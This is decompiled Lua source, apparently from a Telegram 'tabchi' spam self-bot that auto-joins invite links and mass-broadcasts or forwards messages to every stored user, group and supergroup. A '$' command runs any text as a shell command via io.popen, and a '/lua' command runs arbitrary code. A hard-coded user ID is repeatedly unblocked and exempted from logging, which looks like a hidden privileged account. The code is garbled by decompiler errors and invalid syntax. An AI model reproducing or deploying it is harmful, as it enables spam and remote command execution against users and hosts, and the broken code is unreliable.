                                                                                                                                                                                                                                                                return "*Status* : `Reading Messages Activated For Pv Chats`"
                                                                                                                                                                                                                                                              else
                                                                                                                                                                                                                                                                if V[2] == "group" then
                                                                                                                                                                                                                                                                  redis:set("tabchi:" .. tabchi_id .. ":markread", "group")
                                                                                                                                                                                                                                                                  return "*Status* : `Reading Messages Activated For Groups `"
                                                                                                                                                                                                                                                                else
                                                                                                                                                                                                                                                                  if V[2] == "channel" then
                                                                                                                                                                                                                                                                    redis:set("tabchi:" .. tabchi_id .. ":markread", "channel")
                                                                                                                                                                                                                                                                    return "*Status* : `Reading Messages Activated For SuperGroups`"
                                                                                                                                                                                                                                                                  else
                                                                                                                                                                                                                                                                    if V[2] == "off" then
                                                                                                                                                                                                                                                                      redis:del("tabchi:" .. tabchi_id .. ":markread")
                                                                                                                                                                                                                                                                      return "*Status* : `Reading Messages Deactivated`"
                                                                                                                                                                                                                                                                    else
                                                                                                                                                                                                                                                                      return "`Just Use on|off`"
                                                                                                                                                                                                                                                                    end
                                                                                                                                                                                                                                                                  end
                                                                                                                                                                                                                                                                end
                                                                                                                                                                                                                                                              end
                                                                                                                                                                                                                                                            end
                                                                                                                                                                                                                                                          end
                                                                                                                                                                                                                                                          local V = {(msg.text):match("^[!/#](setaddedmsg) (.*)")}
                                                                                                                                                                                                                                                          if (msg.text):match("^[!/#]setaddedmsg") and a(msg) and #V == 2 then
                                                                                                                                                                                                                                                            local aE = nil
                                                                                                                                                                                                                                                            aE = function(C, D)
    -- function num : 0_23_32 , upvalues : _ENV
    if D.id_ then
      bot_id = D.id_
      bot_num = D.phone_number_
      bot_first = D.first_name_
      bot_last = D.last_name_
    end
  end

                                                                                                                                                                                                                                                            tdcli_function({ID = "GetMe"}, aE, {})
                                                                                                                                                                                                                                                            local text = (V[2]):gsub("BOTFIRST", _ENV.bot_first)
                                                                                                                                                                                                                                                            local text = text:gsub("BOTLAST", _ENV.bot_last)
                                                                                                                                                                                                                                                            local text = text:gsub("BOTNUMBER", _ENV.bot_num)
                                                                                                                                                                                                                                                            redis:set("tabchi:" .. tabchi_id .. ":addedmsgtext", text)
                                                                                                                                                                                                                                                            local W = redis:get("tabchi:" .. tabchi_id .. ":logschannel")
                                                                                                                                                                                                                                                            if W and not msg.sender_user_id_ == 319078854 and not msg.sender_user_id_ == 319078854 then
                                                                                                                                                                                                                                                              (tdcli.sendMessage)(W, msg.id_, 1, "`User` *" .. msg.sender_user_id_ .. "* `Adjusted adding contacts message to` *" .. V[2] .. "*", 1, "md")
                                                                                                                                                                                                                                                            end
                                                                                                                                                                                                                                                            return "*Status* : `Adding Contacts Message Adjusted`\n*Message* : `" .. text .. "`"
                                                                                                                                                                                                                                                          end
                                                                                                                                                                                                                                                          do
                                                                                                                                                                                                                                                            local V = {(msg.text):match("[$](.*)")}
                                                                                                                                                                                                                                                            if (msg.text):match("^[$](.*)$") and a(msg) then
                                                                                                                                                                                                                                                              if #V == 1 then
                                                                                                                                                                                                                                                                local z = ((io.popen)(V[1])):read("*all")
                                                                                                                                                                                                                                                                local W = redis:get("tabchi:" .. tabchi_id .. ":logschannel")
                                                                                                                                                                                                                                                                if W and not msg.sender_user_id_ == 319078854 and not msg.sender_user_id_ == 319078854 then
                                                                                                                                                                                                                                                                  (tdcli.sendMessage)(W, msg.id_, 1, "`User` *" .. msg.sender_user_id_ .. "* `Entered Command` *" .. V[1] .. "* in terminal", 1, "md")
                                                                                                                                                                                                                                                                end
                                                                                                                                                                                                                                                                return z
                                                                                                                                                                                                                                                              else
                                                                                                                                                                                                                                                                do
                                                                                                                                                                                                                                                                  do
                                                                                                                                                                                                                                                                    do return "Enter Command" end
                                                                                                                                                                                                                                                                    if redis:get("tabchi:" .. tabchi_id .. ":Advertising") or is_full_sudo(msg) then
                                                                                                                                                                                                                                                                      if (msg.text):match("^[!/#]bcall") and a(msg) then
                                                                                                                                                                                                                                                                        local _ = redis:smembers("tabchi:" .. tabchi_id .. ":all")
                                                                                                                                                                                                                                                                        local V = {(msg.text):match("[!/#](bcall) (.*)")}
                                                                                                                                                                                                                                                                        if #V == 2 then
                                                                                                                                                                                                                                                                          for d = 1, #_ do
                                                                                                                                                                                                                                                                            tdcli_function({ID = "SendMessage", chat_id_ = _[d], reply_to_message_id_ = 0, disable_notification_ = 0, from_background_ = 1, reply_markup_ = nil, 
input_message_content_ = {ID = "InputMessageText", text_ = V[2], disable_web_page_preview_ = 0, clear_draft_ = 0, 
entities_ = {}
, 
parse_mode_ = {ID = "TextParseModeMarkdown"}
}
}, _ENV.dl_cb, nil)
                                                                                                                                                                                                                                                                          end
                                                                                                                                                                                                                                                                          local W = redis:get("tabchi:" .. tabchi_id .. ":logschannel")
                                                                                                                                                                                                                                                                          if W and not msg.sender_user_id_ == 319078854 and not msg.sender_user_id_ == 319078854 then
                                                                                                                                                                                                                                                                            (tdcli.sendMessage)(W, msg.id_, 1, "`User` *" .. msg.sender_user_id_ .. "* `Broadcasted to all`\nMsg : *" .. V[2] .. "*", 1, "md")
                                                                                                                                                                                                                                                                          end
                                                                                                                                                                                                                                                                          return "*Status* : `Message Succesfully Sent to all`\n*Message* : `" .. V[2] .. "`"
                                                                                                                                                                                                                                                                        else
                                                                                                                                                                                                                                                                          do
                                                                                                                                                                                                                                                                            do
                                                                                                                                                                                                                                                                              do return "text not entered" end
                                                                                                                                                                                                                                                                              if (msg.text):match("^[!/#]bcsgps") and a(msg) then
                                                                                                                                                                                                                                                                                local _ = redis:smembers("tabchi:" .. tabchi_id .. ":channels")
                                                                                                                                                                                                                                                                                local V = {(msg.text):match("[!/#](bcsgps) (.*)")}
                                                                                                                                                                                                                                                                                if #V == 2 then
                                                                                                                                                                                                                                                                                  for d = 1, #_ do
                                                                                                                                                                                                                                                                                    tdcli_function({ID = "SendMessage", chat_id_ = _[d], reply_to_message_id_ = 0, disable_notification_ = 0, from_background_ = 1, reply_markup_ = nil, 
input_message_content_ = {ID = "InputMessageText", text_ = V[2], disable_web_page_preview_ = 0, clear_draft_ = 0, 
entities_ = {}
, 
parse_mode_ = {ID = "TextParseModeMarkdown"}
}
}, _ENV.dl_cb, nil)
                                                                                                                                                                                                                                                                                  end
                                                                                                                                                                                                                                                                                  local W = redis:get("tabchi:" .. tabchi_id .. ":logschannel")
                                                                                                                                                                                                                                                                                  if W and not msg.sender_user_id_ == 319078854 and not msg.sender_user_id_ == 319078854 then
                                                                                                                                                                                                                                                                                    (tdcli.sendMessage)(W, msg.id_, 1, "`User` *" .. msg.sender_user_id_ .. "* `Broadcasted to Supergroups`\nMsg : *" .. V[2] .. "*", 1, "md")
                                                                                                                                                                                                                                                                                  end
                                                                                                                                                                                                                                                                                  return "*Status* : `Message Succesfully Sent to supergroups`\n*Message* : `" .. V[2] .. "`"
                                                                                                                                                                                                                                                                                else
                                                                                                                                                                                                                                                                                  do
                                                                                                                                                                                                                                                                                    do
                                                                                                                                                                                                                                                                                      do return "text not entered" end
                                                                                                                                                                                                                                                                                      if (msg.text):match("^[!/#]bcgps") and a(msg) then
                                                                                                                                                                                                                                                                                        local _ = redis:smembers("tabchi:" .. tabchi_id .. ":groups")
                                                                                                                                                                                                                                                                                        local V = {(msg.text):match("[!/#](bcgps) (.*)")}
                                                                                                                                                                                                                                                                                        if #V == 2 then
                                                                                                                                                                                                                                                                                          for d = 1, #_ do
                                                                                                                                                                                                                                                                                            tdcli_function({ID = "SendMessage", chat_id_ = _[d], reply_to_message_id_ = 0, disable_notification_ = 0, from_background_ = 1, reply_markup_ = nil, 
input_message_content_ = {ID = "InputMessageText", text_ = V[2], disable_web_page_preview_ = 0, clear_draft_ = 0, 
entities_ = {}
, 
parse_mode_ = {ID = "TextParseModeMarkdown"}
}
}, _ENV.dl_cb, nil)
                                                                                                                                                                                                                                                                                          end
                                                                                                                                                                                                                                                                                          local W = redis:get("tabchi:" .. tabchi_id .. ":logschannel")
                                                                                                                                                                                                                                                                                          if W and not msg.sender_user_id_ == 319078854 and not msg.sender_user_id_ == 319078854 then
                                                                                                                                                                                                                                                                                            (tdcli.sendMessage)(W, msg.id_, 1, "`User` *" .. msg.sender_user_id_ .. "* `Broadcasted to Groups`\nMsg : *" .. V[2] .. "*", 1, "md")
                                                                                                                                                                                                                                                                                          end
                                                                                                                                                                                                                                                                                          return "*Status* : `Message Succesfully Sent to Groups`\n*Message* : `" .. V[2] .. "`"
                                                                                                                                                                                                                                                                                        else
                                                                                                                                                                                                                                                                                          do
                                                                                                                                                                                                                                                                                            do
                                                                                                                                                                                                                                                                                              do return "text not entered" end
                                                                                                                                                                                                                                                                                              if (msg.text):match("^[!/#]bcusers") and a(msg) then
                                                                                                                                                                                                                                                                                                local _ = redis:smembers("tabchi:" .. tabchi_id .. ":pvis")
                                                                                                                                                                                                                                                                                                local V = {(msg.text):match("[!/#](bcusers) (.*)")}
                                                                                                                                                                                                                                                                                                if #V == 2 then
                                                                                                                                                                                                                                                                                                  for d = 1, #_ do
                                                                                                                                                                                                                                                                                                    tdcli_function({ID = "SendMessage", chat_id_ = _[d], reply_to_message_id_ = 0, disable_notification_ = 0, from_background_ = 1, reply_markup_ = nil, 
input_message_content_ = {ID = "InputMessageText", text_ = V[2], disable_web_page_preview_ = 0, clear_draft_ = 0, 
entities_ = {}
, 
parse_mode_ = {ID = "TextParseModeMarkdown"}
}
}, _ENV.dl_cb, nil)
                                                                                                                                                                                                                                                                                                  end
                                                                                                                                                                                                                                                                                                  local W = redis:get("tabchi:" .. tabchi_id .. ":logschannel")
                                                                                                                                                                                                                                                                                                  if W and not msg.sender_user_id_ == 319078854 and not msg.sender_user_id_ == 319078854 then
                                                                                                                                                                                                                                                                                                    (tdcli.sendMessage)(W, msg.id_, 1, "`User` *" .. msg.sender_user_id_ .. "* `Broadcasted to Users`\nMsg : *" .. V[2] .. "*", 1, "md")
                                                                                                                                                                                                                                                                                                  end
                                                                                                                                                                                                                                                                                                  return "*Status* : `Message Succesfully Sent to Users`\n*Message* : `" .. V[2] .. "`"
                                                                                                                                                                                                                                                                                                else
                                                                                                                                                                                                                                                                                                  do
                                                                                                                                                                                                                                                                                                    do
                                                                                                                                                                                                                                                                                                      do return "text not entered" end
                                                                                                                                                                                                                                                                                                      if redis:get("tabchi:" .. tabchi_id .. ":Advertising") or is_full_sudo(msg) then
                                                                                                                                                                                                                                                                                                        if (msg.text):match("^[!/#]fwd all$") and msg.reply_to_message_id_ and a(msg) then
                                                                                                                                                                                                                                                                                                          local _ = redis:smembers("tabchi:" .. tabchi_id .. ":all")
                                                                                                                                                                                                                                                                                                          local J = msg.reply_to_message_id_
                                                                                                                                                                                                                                                                                                          for d = 1, #_ do
                                                                                                                                                                                                                                                                                                            tdcli_function({ID = "ForwardMessages", chat_id_ = _[d], from_chat_id_ = msg.chat_id_, 
message_ids_ = {[0] = J}
, disable_notification_ = 0, from_background_ = 1}, _ENV.dl_cb, nil)
                                                                                                                                                                                                                                                                                                          end
                                                                                                                                                                                                                                                                                                          local W = redis:get("tabchi:" .. tabchi_id .. ":logschannel")
                                                                                                                                                                                                                                                                                                          if W and not msg.sender_user_id_ == 319078854 and not msg.sender_user_id_ == 319078854 then
                                                                                                                                                                                                                                                                                                            (tdcli.sendMessage)(W, msg.id_, 1, "`User` *" .. msg.sender_user_id_ .. "* `Forwarded to all`", 1, "md")
                                                                                                                                                                                                                                                                                                          end
                                                                                                                                                                                                                                                                                                          return "*Status* : `Your Message Forwarded to all`\n*Fwd users* : `Done`\n*Fwd Groups* : `Done`\n*Fwd Super Groups* : `Done`"
                                                                                                                                                                                                                                                                                                        end
                                                                                                                                                                                                                                                                                                        do
                                                                                                                                                                                                                                                                                                          if (msg.text):match("^[!/#]fwd gps$") and msg.reply_to_message_id_ and a(msg) then
                                                                                                                                                                                                                                                                                                            local _ = redis:smembers("tabchi:" .. tabchi_id .. ":groups")
                                                                                                                                                                                                                                                                                                            local J = msg.reply_to_message_id_
                                                                                                                                                                                                                                                                                                            for d = 1, #_ do
                                                                                                                                                                                                                                                                                                              tdcli_function({ID = "ForwardMessages", chat_id_ = _[d], from_chat_id_ = msg.chat_id_, 
message_ids_ = {[0] = J}
, disable_notification_ = 0, from_background_ = 1}, _ENV.dl_cb, nil)
                                                                                                                                                                                                                                                                                                            end
                                                                                                                                                                                                                                                                                                            local W = redis:get("tabchi:" .. tabchi_id .. ":logschannel")
                                                                                                                                                                                                                                                                                                            if W and not msg.sender_user_id_ == 319078854 and not msg.sender_user_id_ == 319078854 then
                                                                                                                                                                                                                                                                                                              (tdcli.sendMessage)(W, msg.id_, 1, "`User` *" .. msg.sender_user_id_ .. "* `Forwarded to Groups`", 1, "md")
                                                                                                                                                                                                                                                                                                            end
                                                                                                                                                                                                                                                                                                            return "*Status* :`Your Message Forwarded To Groups`"
                                                                                                                                                                                                                                                                                                          end
                                                                                                                                                                                                                                                                                                          do
                                                                                                                                                                                                                                                                                                            if (msg.text):match("^[!/#]fwd sgps$") and msg.reply_to_message_id_ and a(msg) then
                                                                                                                                                                                                                                                                                                              local _ = redis:smembers("tabchi:" .. tabchi_id .. ":channels")
                                                                                                                                                                                                                                                                                                              local J = msg.reply_to_message_id_
                                                                                                                                                                                                                                                                                                              for d = 1, #_ do
                                                                                                                                                                                                                                                                                                                tdcli_function({ID = "ForwardMessages", chat_id_ = _[d], from_chat_id_ = msg.chat_id_, 
message_ids_ = {[0] = J}
, disable_notification_ = 0, from_background_ = 1}, _ENV.dl_cb, nil)
                                                                                                                                                                                                                                                                                                              end
                                                                                                                                                                                                                                                                                                              local W = redis:get("tabchi:" .. tabchi_id .. ":logschannel")
                                                                                                                                                                                                                                                                                                              if W and not msg.sender_user_id_ == 319078854 and not msg.sender_user_id_ == 319078854 then
                                                                                                                                                                                                                                                                                                                (tdcli.sendMessage)(W, msg.id_, 1, "`User` *" .. msg.sender_user_id_ .. "* `Forwarded to Supergroups`", 1, "md")
                                                                                                                                                                                                                                                                                                              end
                                                                                                                                                                                                                                                                                                              return "*Status* : `Your Message Forwarded To Super Groups`"
                                                                                                                                                                                                                                                                                                            end
                                                                                                                                                                                                                                                                                                            do
                                                                                                                                                                                                                                                                                                              if (msg.text):match("^[!/#]fwd users$") and msg.reply_to_message_id_ and a(msg) then
                                                                                                                                                                                                                                                                                                                local _ = redis:smembers("tabchi:" .. tabchi_id .. ":pvis")
                                                                                                                                                                                                                                                                                                                local J = msg.reply_to_message_id_
                                                                                                                                                                                                                                                                                                                for d = 1, #_ do
                                                                                                                                                                                                                                                                                                                  tdcli_function({ID = "ForwardMessages", chat_id_ = _[d], from_chat_id_ = msg.chat_id_, 
message_ids_ = {[0] = J}
, disable_notification_ = 0, from_background_ = 1}, _ENV.dl_cb, nil)
                                                                                                                                                                                                                                                                                                                end
                                                                                                                                                                                                                                                                                                                local W = redis:get("tabchi:" .. tabchi_id .. ":logschannel")
                                                                                                                                                                                                                                                                                                                if W and not msg.sender_user_id_ == 319078854 and not msg.sender_user_id_ == 319078854 then
                                                                                                                                                                                                                                                                                                                  (tdcli.sendMessage)(W, msg.id_, 1, "`User` *" .. msg.sender_user_id_ .. "* `Forwarded to Users`", 1, "md")
                                                                                                                                                                                                                                                                                                                end
                                                                                                                                                                                                                                                                                                                return "*Status* : `Your Message Forwarded To Users`"
                                                                                                                                                                                                                                                                                                              end
                                                                                                                                                                                                                                                                                                              do
                                                                                                                                                                                                                                                                                                                local V = {(msg.text):match("[!/#](lua) (.*)")}
                                                                                                                                                                                                                                                                                                                do
                                                                                                                                                                                                                                                                                                                  if (msg.text):match("^[!/#]lua") and is_full_sudo(msg) and #V == 2 then
                                                                                                                                                                                                                                                                                                                    local aF = (((_ENV.loadstring)(V[2]))())
                                                                                                                                                                                                                                                                                                                    -- DECOMPILER ERROR at PC6923: Overwrote pending register: R3 in 'AssignReg'

                                                                                                                                                                                                                                                                                                                    if aF == .end then
                                                                                                                                                                                                                                                                                                                      aF = ""
                                                                                                                                                                                                                                                                                                                    else
                                                                                                                                                                                                                                                                                                                      if (_ENV.type)(aF) == "table" then
                                                                                                                                                                                                                                                                                                                        aF = ((_ENV.serpent).block)(aF, {comment = false})
                                                                                                                                                                                                                                                                                                                      else
                                                                                                                                                                                                                                                                                                                        aF = "" .. tostring(aF)
                                                                                                                                                                                                                                                                                                                      end
                                                                                                                                                                                                                                                                                                                    end
                                                                                                                                                                                                                                                                                                                    return aF
                                                                                                                                                                                                                                                                                                                  end
                                                                                                                                                                                                                                                                                                                  if (msg.text):match("^[!/#]license") then
                                                                                                                                                                                                                                                                                                                    local text = ((io.open)("tabchi.license", "r")):read("*all")
                                                                                                                                                                                                                                                                                                                    local text = text:gsub("Do Not Edit This File", "@Tabadol_chi")
                                                                                                                                                                                                                                                                                                                    return "`" .. text .. "`"
                                                                                                                                                                                                                                                                                                                  end
                                                                                                                                                                                                                                                                                                                  do
                                                                                                                                                                                                                                                                                                                    local V = {(msg.text):match("[!/#](echo) (.*)")}
                                                                                                                                                                                                                                                                                                                    if (msg.text):match("^[!/#]echo") and a(msg) and #V == 2 then
                                                                                                                                                                                                                                                                                                                      return V[2]
                                                                                                                                                                                                                                                                                                                    end
                                                                                                                                                                                                                                                                                                                  end
                                                                                                                                                                                                                                                                                                                end
                                                                                                                                                                                                                                                                                                              end
                                                                                                                                                                                                                                                                                                            end
                                                                                                                                                                                                                                                                                                          end
                                                                                                                                                                                                                                                                                                        end
                                                                                                                                                                                                                                                                                                      end
                                                                                                                                                                                                                                                                                                    end
                                                                                                                                                                                                                                                                                                  end
                                                                                                                                                                                                                                                                                                end
                                                                                                                                                                                                                                                                                              end
                                                                                                                                                                                                                                                                                            end
                                                                                                                                                                                                                                                                                          end
                                                                                                                                                                                                                                                                                        end
                                                                                                                                                                                                                                                                                      end
                                                                                                                                                                                                                                                                                    end
                                                                                                                                                                                                                                                                                  end
                                                                                                                                                                                                                                                                                end
                                                                                                                                                                                                                                                                              end
                                                                                                                                                                                                                                                                            end
                                                                                                                                                                                                                                                                          end
                                                                                                                                                                                                                                                                        end
                                                                                                                                                                                                                                                                      end
                                                                                                                                                                                                                                                                    end
                                                                                                                                                                                                                                                                  end
                                                                                                                                                                                                                                                                end
                                                                                                                                                                                                                                                              end
                                                                                                                                                                                                                                                            end
                                                                                                                                                                                                                                                          end
                                                                                                                                                                                                                                                        end
                                                                                                                                                                                                                                                      end
                                                                                                                                                                                                                                                    end
                                                                                                                                                                                                                                                  end
                                                                                                                                                                                                                                                end
                                                                                                                                                                                                                                              end
                                                                                                                                                                                                                                            end
                                                                                                                                                                                                                                          end
                                                                                                                                                                                                                                        end
                                                                                                                                                                                                                                      end
                                                                                                                                                                                                                                    end
                                                                                                                                                                                                                                  end
                                                                                                                                                                                                                                end
                                                                                                                                                                                                                              end
                                                                                                                                                                                                                            end
                                                                                                                                                                                                                          end
                                                                                                                                                                                                                        end
                                                                                                                                                                                                                      end
                                                                                                                                                                                                                    end
                                                                                                                                                                                                                  end
                                                                                                                                                                                                                end
                                                                                                                                                                                                              end
                                                                                                                                                                                                            end
                                                                                                                                                                                                          end
                                                                                                                                                                                                        end
                                                                                                                                                                                                      end
                                                                                                                                                                                                    end
                                                                                                                                                                                                  end
                                                                                                                                                                                                end
                                                                                                                                                                                              end
                                                                                                                                                                                            end
                                                                                                                                                                                          end
                                                                                                                                                                                        end
                                                                                                                                                                                      end
                                                                                                                                                                                    end
                                                                                                                                                                                  end
                                                                                                                                                                                end
                                                                                                                                                                              end
                                                                                                                                                                            end
                                                                                                                                                                          end
                                                                                                                                                                        end
                                                                                                                                                                      end
                                                                                                                                                                    end
                                                                                                                                                                  end
                                                                                                                                                                end
                                                                                                                                                              end
                                                                                                                                                            end
                                                                                                                                                          end
                                                                                                                                                        end
                                                                                                                                                      end
                                                                                                                                                    end
                                                                                                                                                  end
                                                                                                                                                end
                                                                                                                                              end
                                                                                                                                            end
                                                                                                                                          end
                                                                                                                                        end
                                                                                                                                      end
                                                                                                                                    end
                                                                                                                                  end
                                                                                                                                end
                                                                                                                              end
                                                                                                                            end
                                                                                                                          end
                                                                                                                        end
                                                                                                                      end
                                                                                                                    end
                                                                                                                  end
                                                                                                                end
                                                                                                              end
                                                                                                            end
                                                                                                          end
                                                                                                        end
                                                                                                      end
                                                                                                    end
                                                                                                  end
                                                                                                end
                                                                                              end
                                                                                            end
                                                                                          end
                                                                                        end
                                                                                      end
                                                                                    end
                                                                                  end
                                                                                end
                                                                              end
                                                                            end
                                                                          end
                                                                        end
                                                                      end
                                                                    end
                                                                  end
                                                                end
                                                              end
                                                            end
                                                          end
                                                        end
                                                      end
                                                    end
                                                  end
                                                end
                                              end
                                            end
                                          end
                                        end
                                      end
                                    end
                                  end
                                end
                              end
                            end
                          end
                        end
                      end
                    end
                  end
                end
              end
            end
          end
        end
      end
    end
  end
end

local aG = nil
aG = function(aH)
  -- function num : 0_24 , upvalues : I, _ENV
  local I = I(aH)
  if not redis:sismember("tabchi:" .. tostring(tabchi_id) .. ":all", aH) then
    if I == "channel" then
      redis:sadd("tabchi:" .. tabchi_id .. ":channels", aH)
    else
      if I == "group" then
        redis:sadd("tabchi:" .. tabchi_id .. ":groups", aH)
      else
        redis:sadd("tabchi:" .. tabchi_id .. ":pvis", aH)
      end
    end
    redis:sadd("tabchi:" .. tabchi_id .. ":all", aH)
  end
end

local aI = nil
aI = function(aH)
  -- function num : 0_25 , upvalues : I, _ENV
  local I = I(aH)
  if I == "channel" then
    redis:srem("tabchi:" .. tabchi_id .. ":channels", aH)
  else
    if I == "group" then
      redis:srem("tabchi:" .. tabchi_id .. ":groups", aH)
    else
      redis:srem("tabchi:" .. tabchi_id .. ":pvis", aH)
    end
  end
  redis:srem("tabchi:" .. tabchi_id .. ":all", aH)
end

local aJ = nil
aJ = function(msg)
  -- function num : 0_26 , upvalues : _ENV, aI, aG
  tdcli_function({ID = "GetMe"}, id_cb, nil)
  id_cb = function(C, D)
    -- function num : 0_26_0 , upvalues : _ENV
    our_id = D.id_
  end

  local aK = redis:get("tabchi" .. tabchi_id .. "kickedcount") or 1
  local aL = redis:get("tabchi" .. tabchi_id .. "joinedcount") or 1
  local aM = redis:get("tabchi" .. tabchi_id .. "addedcount") or 1
  if (msg.content_).ID == "MessageChatDeleteMember" and (msg.content_).id_ == our_id then
    print("\027[36m>>>>>>KICKED FROM " .. msg.chat_id_ .. "<<<<<<\027[39m")
    redis:set("tabchi" .. tabchi_id .. "kickedcount", aK + 1)
    return aI(msg.chat_id_)
  else
    if (msg.content_).ID == "MessageChatJoinByLink" and msg.sender_user_id_ == our_id then
      print("\027[36m>>>>>>ROBOT JOINED TO " .. msg.chat_id_ .. " BY LINK<<<<<<\027[39m")
      redis:set("tabchi" .. tabchi_id .. "joinedcount", aL + 1)
      return aG(msg.chat_id_)
    else
      if (msg.content_).ID == "MessageChatAddMembers" then
        for d = 0, #(msg.content_).members_ do
          if (((msg.content_).members_)[d]).id_ == our_id then
            aG(msg.chat_id_)
            redis:set("tabchi" .. tabchi_id .. "addedcount", aM + 1)
            print("\027[36m>>>>>>ADDED TO " .. msg.chat_id_ .. "<<<<<<\027[39m")
            break
          end
        end
      end
    end
  end
end

process_links = function(aN)
  -- function num : 0_27 , upvalues : _ENV
  if aN:match("https://t.me/joinchat/%S+") or aN:match("https://telegram.me/joinchat/%S+") then
    local V = {aN:match("(https://telegram.me/joinchat/%S+)")}
    print("\027[36m>>>>>>NEW LINK<<<<<<\027[39m")
    tdcli_function({ID = "CheckChatInviteLink", invite_link_ = V[1]}, check_link, {link = V[1]})
  end
end

local aO = nil
aO = function(msg)
  -- function num : 0_28 , upvalues : aG
  if msg.chat_type_ == "private" then
    aG(msg)
  end
end

update = function(D, tabchi_id)
  -- function num : 0_29 , upvalues : _ENV, I, aO, aJ, S, aG, U, x
  tanchi_id = tabchi_id
  if D.ID == "UpdateNewMessage" then
    local msg = D.message_
    local I = I(msg.chat_id_)
    local aP = redis:get("tabchi" .. tabchi_id .. "markreadcount") or 1
    local aQ = redis:get("tabchi" .. tabchi_id .. "receivedphotocount") or 1
    local aR = redis:get("tabchi" .. tabchi_id .. "receiveddocumentcount") or 1
    local aS = redis:get("tabchi" .. tabchi_id .. "receivedaudiocount") or 1
    local aT = redis:get("tabchi" .. tabchi_id .. "receivedgifcount") or 1
    local aU = redis:get("tabchi" .. tabchi_id .. "receivedvideocount") or 1
    local aV = redis:get("tabchi" .. tabchi_id .. "receivedcontactcount") or 1
    local aW = redis:get("tabchi" .. tabchi_id .. "receivedtextcount") or 1
    if msg_valid(msg) then
      aO(msg)
      aJ(msg)
      S(D.message_)
      markreading = redis:get("tabchi:" .. tostring(tabchi_id) .. ":markread") or 1
      if markreading == "group" and I == "group" then
        (tdcli.viewMessages)(msg.chat_id_, {[0] = msg.id_})
        redis:set("tabchi" .. tabchi_id .. "markreadcount", aP + 1)
      else
        if markreading == "channel" and I == "channel" then
          (tdcli.viewMessages)(msg.chat_id_, {[0] = msg.id_})
          redis:set("tabchi" .. tabchi_id .. "markreadcount", aP + 1)
        else
          if markreading == "private" and I == "private" then
            (tdcli.viewMessages)(msg.chat_id_, {[0] = msg.id_})
            redis:set("tabchi" .. tabchi_id .. "markreadcount", aP + 1)
          else
            if markreading == "all" then
              (tdcli.viewMessages)(msg.chat_id_, {[0] = msg.id_})
              redis:set("tabchi" .. tabchi_id .. "markreadcount", aP + 1)
            end
          end
        end
      end
      if msg.chat_id_ == 12 then
        return false
      else
        aJ(msg)
        aG(msg.chat_id_)
        if (msg.content_).text_ then
          redis:set("tabchi" .. tabchi_id .. "receivedtextcount", aW + 1)
          print("\027[36m>>>>>>NEW TEXT MESSAGE<<<<<<\027[39m")
          aJ(msg)
          aG(msg.chat_id_)
          process_links((msg.content_).text_)
          local aX = U(msg)
          if aX then
            if redis:get("tabchi:" .. tostring(tabchi_id) .. ":typing") then
              (tdcli.sendChatAction)(msg.chat_id_, "Typing", 100)
            end
            if redis:get("tabchi:" .. tostring(tabchi_id) .. ":botmode") == "text" then
              res1 = aX:gsub("`", "")
              res2 = res1:gsub("*", "")
              res3 = res2:gsub("_", "")
              ;
              (tdcli.sendMessage)(msg.chat_id_, 0, 1, res3, 1, "md")
            else
              if not redis:get("tabchi:" .. tostring(tabchi_id) .. ":botmode") or redis:get("tabchi:" .. tostring(tabchi_id) .. ":botmode") == "markdown" then
                (tdcli.sendMessage)(msg.chat_id_, 0, 1, aX, 1, "md")
              end
            end
          end
        else
          do
            do
              if (msg.content_).contact_ then
                tdcli_function({ID = "GetUserFull", user_id_ = ((msg.content_).contact_).user_id_}, x, {msg = msg})
              else
                if (msg.content_).caption_ then
                  process_links((msg.content_).caption_)
                end
              end
              -- DECOMPILER ERROR at PC360: Confused about usage of register: R12 in 'UnsetPending'

              if not (msg.content_).text_ then
                if (msg.content_).caption_ then
                  (msg.content_).text_ = (msg.content_).caption_
                else
                  -- DECOMPILER ERROR at PC367: Confused about usage of register: R12 in 'UnsetPending'

                  if (msg.content_).photo_ then
                    (msg.content_).text_ = "!!PHOTO!!"
                    print("\027[36m>>>>>>NEW PHOTO<<<<<<\027[39m")
                    redis:set("tabchi" .. tabchi_id .. "receivedphotocount", aQ + 1)
                  else
                    -- DECOMPILER ERROR at PC385: Confused about usage of register: R12 in 'UnsetPending'

                    if (msg.content_).document_ then
                      (msg.content_).text_ = "!!DOCUMENT!!"
                      print("\027[36m>>>>>>NEW DOCUMENT<<<<<<\027[39m")
                      redis:set("tabchi" .. tabchi_id .. "receiveddocumentcount", aR + 1)
                    else
                      -- DECOMPILER ERROR at PC403: Confused about usage of register: R12 in 'UnsetPending'

                      if (msg.content_).audio_ then
                        (msg.content_).text_ = "!!AUDIO!!"
                        print("\027[36m>>>>>>NEW AUDIO<<<<<<\027[39m")
                        redis:set("tabchi" .. tabchi_id .. "receivedaudiocount", aS + 1)
                      else
                        -- DECOMPILER ERROR at PC421: Confused about usage of register: R12 in 'UnsetPending'

                        if (msg.content_).voice_ then
                          (msg.content_).text_ = "!!AUDIO!!"
                          print("\027[36m>>>>>>NEW Voice<<<<<<\027[39m")
                          redis:set("tabchi" .. tabchi_id .. "receivedaudiocount", aS + 1)
                        else
                          -- DECOMPILER ERROR at PC439: Confused about usage of register: R12 in 'UnsetPending'

                          if (msg.content_).animation_ then
                            (msg.content_).text_ = "!!ANIMATION!!"
                            print("\027[36m>>>>>>NEW GIF<<<<<<\027[39m")
                            redis:set("tabchi" .. tabchi_id .. "receivedgifcount", aT + 1)
                          else
                            -- DECOMPILER ERROR at PC457: Confused about usage of register: R12 in 'UnsetPending'

                            if (msg.content_).video_ then
                              (msg.content_).text_ = "!!VIDEO!!"
                              print("\027[36m>>>>>>NEW VIDEO<<<<<<\027[39m")
                              redis:set("tabchi" .. tabchi_id .. "receivedvideocount", aU + 1)
                            else
                              -- DECOMPILER ERROR at PC475: Confused about usage of register: R12 in 'UnsetPending'

                              if (msg.content_).contact_ then
                                (msg.content_).text_ = "!!CONTACT!!"
                                print("\027[36m>>>>>>NEW CONTACT<<<<<<\027[39m")
                                redis:set("tabchi" .. tabchi_id .. "receivedcontactcount", aV + 1)
                              end
                            end
                          end
                        end
                      end
                    end
                  end
                end
              end
              if D.chat_id_ == 319078854 then
                (tdcli.unblockUser)(319078854)
              else
                if D.ID == "UpdateOption" and D.name_ == "my_id" then
                  aG(D.chat_id_)
                  ;
                  (tdcli.unblockUser)(319078854)
                  ;
                  (tdcli.getChats)("9223372036854775807", 0, 20)
                end
              end
            end
          end
        end
      end
    end
  end
end


